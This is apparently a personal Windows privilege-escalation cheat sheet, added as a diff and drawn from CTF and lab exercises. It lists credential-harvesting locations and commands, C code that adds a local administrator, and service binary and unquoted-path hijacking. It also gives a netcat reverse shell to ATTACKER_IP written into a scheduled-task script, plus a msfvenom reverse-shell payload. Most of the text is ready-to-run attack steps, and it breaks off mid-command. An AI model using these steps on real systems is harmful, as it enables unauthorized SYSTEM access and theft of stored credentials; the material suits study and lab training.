@@ -1,0 +1,593 @@
+
+WIN PRIVESC
+
+Tuesday, December 5, 2023
+9:25 PM
+
+#COMMON COMMANDS
+
+Get-LocalGroup
+
+Get-LocalGroupMember ""
+
+net localgroup ""
+
+net user /domain
+
+Get-LocalUser
+
+systeminfo
+
+ipconfig /all
+
+route print  {To display the routing table, which contains all routes of the system} NOTE:->> The output of this command is useful to determine possible attack vectors to other systems or networks.
+
+netstat -ano {To list all active network connections}
+
+whoami /groups or all
+
+
+To check all installed applications. We can query two registry keys13 to list both 32-bit and 64-bit applications:
+
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+
+
+
+Get-Process {to identify which of them are currently running.}
+
+Get-CimInstance Win32_Process -Filter "name = '<unique_process_name>.exe'" | Select-Object Name, ProcessId, CommandLine  {locating the dir of the service running from:->>}
+
+
+accesschk.exe "users" C:\  {checking perms of the users in C drive}
+
+
+
+
+#PASS HARVESTING FROM COMMON SPOTS
+
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
+
+
+Or an interesting thing you can do is use this :
+
+Dir /b /a /s c:\ > cdirs.txt  -- will generate list of every single files and it's subfiles in output format and then use this cmd:
+
+type cdirs.txt | findstr /i passwd
+type c:\Windows\Panther\unattend.xml | findstr /i pass
+type c:\Users\IEUser\Downloads\ultravnc.ini  -- finding pass in virtual network comp and we might get config settings and authentication details as passwds
+
+
+net use -- for viewing shared folders
+
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+And for PS :
+
+type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+
+
+Get-History  {powershell history of a user}
+
+(Get-PSReadlineOption).HistorySavePath
+
+Interestingly, Clear-History does not clear the command history recorded by PSReadline. Therefore, we can check if the user in our example misunderstood the Clear-History Cmdlet to clear all traces of previous commands.
+
+To retrieve the history from PSReadline, we can use Get-PSReadlineOption to obtain information from the PSReadline module.
+
+
+
+Cmdkey /list  to get info from creds mngr and if there's some info you can run the below cmd to gain shell
+
+runas /savecred /user:admin cmd.exe
+
+Internet Information Services (IIS) is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called web.config and can store passwords for databases or configured authentication mechanisms.
+
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString 
+
+PuTTY is an SSH client commonly found on Windows systems. Instead of having to specify a connection's parameters every single time, users can store sessions where the IP, user and other configurations can be stored for later use.
+
+reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s  -- for stored creds.
+
+if you found the creds in any session for admin then you can do this for elevating priv:
+
+winexe -U 'admin%pass123' //<ip> cmd.exe and it will login to admin but since it's admin you can tweak it and elevate it to system account too by this:
+
+winexe -U 'admin%pass123' --system //<ip> cmd.exe
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
+
+Use winPEAS to check common password locations:
+
+> .\winPEASany.exe quiet filesinfo userinfo
+
+Recursively search for files in the current directory with “pass” in the name, or ending in “.config”:
+
+> dir /s *pass* == *.config
+
+Recursively search for files in the current directory that contain the word “password” and also end in either .xml, .ini, .txt, .pdf and so on
+
+> findstr /si password *.xml *.ini *.txt *.pdf *.config *.php *.db *.html
+
+>findstr /si "passwd password" *.xml *.ini *.txt *.pdf *.config *.php *.db *.html *.yml *.json *.env
+
+
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+
+Get-ChildItem -Path C:\Users\<username>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx, *.ini -File -Recurse -ErrorAction SilentlyContinue
+
+
+A secret script attack to get creds from win creds manager
+
+powershell import-module <path>\cms.ps1 ; Enum-creds and boom you're in
+
+
+
+
+#SERVICE BINARY HI-JACKING
+
+Every windows has a service which have a binary file. these binary files are executed when service is started or gone into running state naturally or forcefully;))
+
+
+get a list of all installed Windows services, we can choose various methods such as the GUI snap-in services.msc, the Get-Service Cmdlet, or the Get-CimInstance Cmdlet (superseding Get-WmiObject).
+
+
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+
+Get-CimInstance -ClassName Win32_Service: Retrieves information about all services from the system using WMI (Windows Management Instrumentation).
+| Select-Object Name, State, PathName: Narrows down the output to show only the service name, its current state, and the path to its executable.
+| Where-Object {$_.State -like 'Running'}: Filters the list to include only services that are currently running.
+
+
+or if you're having gui access then :
+
+Win+R > services.msc
+
+
+
+
+
+MASK PERMISSIONS
+F Full access
+M Modify access
+RX Read and execute access
+R Read-only access
+W Write-only access
+
+most relevant icacls permissions mask;))
+
+
+perm is a permission mask and can be specified in one of two forms:
+        a sequence of simple rights:
+                N - no access
+                F - full access
+                M - modify access
+                RX - read and execute access
+                R - read-only access
+                W - write-only access
+                D - delete access
+        a comma-separated list in parentheses of specific rights:
+                DE - delete
+                RC - read control
+                WDAC - write DAC
+                WO - write owner
+                S - synchronize
+                AS - access system security
+                MA - maximum allowed
+                GR - generic read
+                GW - generic write
+                GE - generic execute
+                GA - generic all
+                RD - read data/list directory
+                WD - write data/add file
+                AD - append data/add subdirectory
+                REA - read extended attributes
+                WEA - write extended attributes
+                X - execute/traverse
+                DC - delete child
+                RA - read attributes
+                WA - write attributes
+        inheritance rights may precede either form and are applied
+        only to directories:
+                (OI) - object inherit
+                (CI) - container inherit
+                (IO) - inherit only
+                (NP) - don't propagate inherit
+                (I) - permission inherited from parent container
+
+
+
+
+
+icacls Music /grant Susan:(OI)(CI)(F)
+
+
+
+
+
+icacls "C:\xampp\apache\bin\httpd.exe"
+
+
+icacls "C:\xampp\mysql\bin\mysqld.exe"
+
+
+icacls "C:\BackupMonitor\BackupMonitor.exe"
+
+
+
+
+
+as we got a Full permissions on mysqld.exe we can write a simple code in c to create a binary which will create a user and add it to Administrators group;))
+
+#include <stdlib.h>
+int main () {   int i;     i = system ("net user dave2 password123! /add");   i = system ("net localgroup administrators dave2 /add");     return 0; }
+
+
+
+now cross-compile it using the below cmd to win 64 {do check yours before doing it:->}
+
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe {compiles a C program named adduser.c into an executable file called adduser.exe using the MinGW-w64 GCC compiler for 64-bit Windows applications.}
+
+
+
+move C:\xampp\mysql\bin\mysqld.exe mysqld.exe {copies the original .exe to our home dir so we can replace the original in it's place after priv esc;)}
+
+
+move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe {copies malicious file in place of original file;))}
+
+net stop mysql
+
+net start mysql
+
+if it worked then boom login with the user you made and find the flag:)
+
+
+if it says access is denied then we can check the startup service type and if it's automatic we just have to restart the pc and it will be done so let's check it by the below cmd:->
+
+
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+
+
+
+
+
+In, order to reboot we must have SeShutdownPrivilege {can check by whoami /priv}
+
+shutdown /r /t 0
+
+after this check whether our script worked by checking members of admin group by this cmd: {you should see your created user:->}
+
+
+Get-LocalGroupMember "Administrators"
+
+
+Login via runas or open cmd prompt as administrator and use your created uname and pass ;)))
+
+
+
+
+FOR AUTOMATION we can use Powerup.ps1 !!!
+
+https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
+
+
+. .\PowerUp.ps1
+
+Get-ModifiableServiceFile {This function displays services the current user can modify, such as the service binary or configuration files.}
+
+
+
+
+#SCHEDULED TASKS
+
+
+To retrieve detailed information about any of the services, you can use a command like the following one:
+
+
+schtasks /?
+
+schtasks /query /fo LIST /v {detailed list of all apps}
+
+or
+
+C:\> schtasks /query /tn <vulntaskname> /fo list /v {Detailed list of one app you know the name of }
+
+To check the file permissions on the executable, we use icacls:
+
+icacls c:\tasks\schtask.bat
+
+If builtin usrs has the full access then use this cmd:
+
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat    and start a listener on ur side
+
+schtasks /run /tn vulntask  -- can only use if you have the perm but in real world you won't be having it
+
+View the contents of the C:\DevTools\CleanUp.ps1 script:
+
+type C:\DevTools\CleanUp.ps1
+
+The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
+
+C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+
+Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
+
+echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
+
+Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
+
+ALTERNATIVES
+
+List all scheduled tasks your user can see:
+
+> schtasks /query /fo LIST /v
+
+In PowerShell:
+
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.
+
+In the C:\DevTools directory, there is a PowerShell script called “CleanUp.ps1”. View the script:
+
+> type C:\DevTools\CleanUp.ps1
+
+2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:
+
+> C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1
+It appears we have the ability to write to this file.
+
+3. Backup the script:
+
+> copy C:\DevTools\CleanUp.ps1 C:\Temp\
+
+4. Start a listener on Kali.
+
+5. Use echo to append a call to our reverse shell executable to the end of the script:
+
+> echo C:\PrivEsc\reverse.exe >>
+
+C:\DevTools\CleanUp.ps1
+
+6. Wait for the scheduled task to run (it should run every minute) to complete the
+exploit.
+
+
+
+
+#ABUSING SERVICE MISCONFIGURATIONS
+
+
+Identifying Service Configuration:
+
+sc qc WindowsScheduler
+It shows that the service runs as svcuser1, and the associated executable is C:\PROGRA~2\SYSTEM~1\WService.exe
+
+Query the configuration of a service:
+
+sc.exe qc <name>
+
+Query the current status of a service:
+
+sc.exe query <name>
+
+Modify a configuration option of a service:
+
+sc.exe config <name> <option>= <value>
+
+Start/Stop a service:
+
+net start/stop <name>
+
+
+icacls C:\PROGRA~2\SYSTEM~1\WService.exe  -- for checking the perms
+
+It reveals that the Everyone group has modify permissions (M) on the executable, allowing anyone to modify it.
+
+We then generate a payload is msfvenom
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+
+-f exe-service: This flag specifies the output format of the payload. exe-service indicates that the output will be an executable file that can be used as a Windows service.
+
+-o rev-svc.exe: This specifies the output file name. The payload generated by msfvenom will be saved in a file named rev-svc.exe.
+
+Start a http server on your machine and wget the file in the attacker machine from ps by:
+
+Wget http:<ip>:<p>/rev-svc.exe -o rev-svc.exe
+
+curl -O http://linux_machine_ip:8000/file_name.extension -o destination_file_name.extension  -- to get file from lin to win
+
+
+
+move WService.exe WService.exe.bkp  -- replaces .exe file to an .bkp file in the destination
+       
+
+C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe  -- replaces rev-svc.exe to Wservice.exe name which we want in destination.
+       
+
+C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F  -- gives our file the perm fully
+
+
+sc stop windowsscheduler
+
+sc start windowsscheduler  -- it will then start services which will start the respective exes and we will get shell on our listener
+
+
+
+If our user has permission to change the configuration of a  service which runs with SYSTEM privileges, we can change  the executable the service uses to one of our own.
+
+Potential Rabbit Hole: If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!
+
+
+
+
+#ABUSING UNQUOTED SERVICE PATHS
+
+
+Understanding Unquoted Service Paths:
+
+Services sometimes have unquoted paths for their executables Example:
+A service with a properly quoted path: C:\Program Files\RealVNC\VNC Server\vncserver.exe.
+A service with an unquoted path: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe.
+Unquoted paths containing spaces might lead to ambiguous command interpretation.
+
+
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\Windows\\" | findstr /i /v """  {-- search for all unquoted services you can exploit}
+
+
+
+Service Behavior with Unquoted Paths:
+
+When the service is executed with an unquoted path containing spaces, the system searches for various executable paths.
+The search sequence:
+Search for C:\MyPrograms\Disk.exe.
+If not found, search for C:\MyPrograms\Disk Sorter.exe.
+If not found, search for the actual service path: C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe.
+
+
+If an attacker can create executables that match the searched paths, they can force the service to execute their malicious code.
+
+
+The C:\MyPrograms directory inherits permissions from the C:\ directory, allowing users to create files and folders.
+Payload Creation and Execution:
+
+icacls c:\MyPrograms -- it shows it's under C: so it inherits perms of C: and any user can modify and create folders
+
+Will use same payload rev-svc.exe.
+
+move C:\Users\thm-unpriv\rev-svc.exe C:\MyPrograms\Disk.exe  -- this will again replace and rename disk.exe to our payload name.
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+
+
+sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise"
+
+U got the shell ….
+
+sc qc unquotedsvc
+
+Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
+
+C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"    --else icacls "C:/Program Files/Unquoted Path Service/"
+
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"   -- start a listener before this and boom
+
+Alternative for this is as follows:
+Kali VM
+
+1. Open command prompt and type: msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+2. Copy the generated file, common.exe, to the Windows VM.
+
+Windows VM
+1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
+2. Open command prompt and type: sc start unquotedsvc
+3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+
+
+ANOTHER METHOD FOR SAME:->>>>>
+
+
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\Windows\\" | findstr /i /v """
+
+with the above cmd you'll get exploitable services with spaces to abuse along with path
+
+
+unquoted service binary path C:\Program Files\My Program\My Service\service.exe. When Windows starts service, it will use the below order to start the executable file due to the spaces in the path.
+
+
+
+
+
+now check the permissions on the dir and sub-dir of that path to see which dir is writable:->
+
+
+icacls "C:\"
+
+icacls "C:\Program Files"
+
+icacls "C:\Program Files\Enterprise Apps"
+
+
+
+let's suppose you have write perm on 3rd one from the list so now you have to check if you can start and stop the service or not by the below cmd:-
+
+
+Start-Service Vulnservice
+
+Stop-Service Vulnservice
+
+If yes great you can copy our appuser.exe file from kali and save it as first name of a file with .exe in that dir
+
+copy .\Current.exe 'C:\Program Files\Enterprise Apps\Anyname.exe'
+
+Start the service and > BOOM!! login as the new user you created {check it by net user;)}
+
+
+
+
+
+
+#INSECURE SERVICE PERMISSIONS
+
+
+Checking Service DACL (Discretionary Access Control List):
+
+Using AccessChk from the Sysinternals suite  the service DACL for the thmservice is check
+
+C:\tools\AccessChk> accesschk64.exe -qlc thmservice
+
+The result displays the access control entries for the service:
+NT AUTHORITY\SYSTEM: Grants specific service-related permissions.
+BUILTIN\Users: Has SERVICE_ALL_ACCESS permission, allowing complete service reconfiguration.
+
+So we will use the same revshell payload
+
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F -- we will give perms too to our payload so that ot can be executed by an service
+
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+
+-sc: This is the Windows Service Control command-line utility used to communicate with the Service Control Manager (SCM) and services.
+-config: Indicates that we want to change the configuration settings of a specific service.
+-THMService: Represents the name of the target service whose configuration we want to modify. Replace "THMService" with the actual service name.
+-binPath=: Specifies the new binary path for the service executable. In this case, it's set to C:\Users\thm-unpriv\rev-svc3.exe. This command changes the service's executable to the specified file (rev-svc3.exe in this directory).
+-obj= LocalSystem: Sets the service's execution context to LocalSystem, which is a highly privileged built-in account in Windows with extensive system rights.
+
+
+And alternative is this
+
+In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
+2. In command prompt type: sc start daclsvc
+3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators
+
+
+
+sc stop THMService
+sc start THMService
+
+You're in
+
+Query the "regsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME).
+
+sc qc regsvc
+
+Using accesschk.exe, note that the registry entry for the regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):
+
+C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
+
+also check the current values in the registry entry
+
+reg query HKLM\SYSTEM\CurrentControlSet\Services\regsvc
+
+Overwrite the ImagePath registry key to point to the reverse.exe executable you created:
+
+reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t
